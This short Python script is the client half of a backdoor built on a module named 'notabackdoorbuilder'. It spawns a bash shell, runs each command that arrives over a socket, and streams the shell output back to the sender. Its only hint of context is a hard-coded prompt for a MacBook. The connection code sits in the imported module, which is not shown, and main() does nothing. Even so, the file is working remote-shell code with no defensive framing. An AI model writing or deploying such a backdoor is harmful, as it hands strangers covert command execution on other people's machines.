import notabackdoorbuilder
import threading
import pexpect


def handle_output(context, callback):
	while True:
		shell = context.get("shell")
		shell.expect(".")
		context["output_buffer"] += shell.before.decode()
		callback(context)

def handle_new_output(context):
	output_buffer = context.get("output_buffer")
	sock = context.get("socket")
	sock.send(output_buffer.encode())
	if "Joels-MacBook-Air%" in output_buffer:
		context["output_buffer"] = ""
		sock.send("\u0003")

def handle_command(context):
	if not context.get("shell"):
		context["shell"] = pexpect.spawn("bash")
		context["output_buffer"] = ""
		context["output_thread"] = threading.Thread(target=handle_output, args=(context, handle_new_output))
		context["output_thread"].start()
	shell = context.get("shell")
	shell.sendline(context.get("data"))

notabackdoorbuilder.handle_setup("client")

def main():
	pass
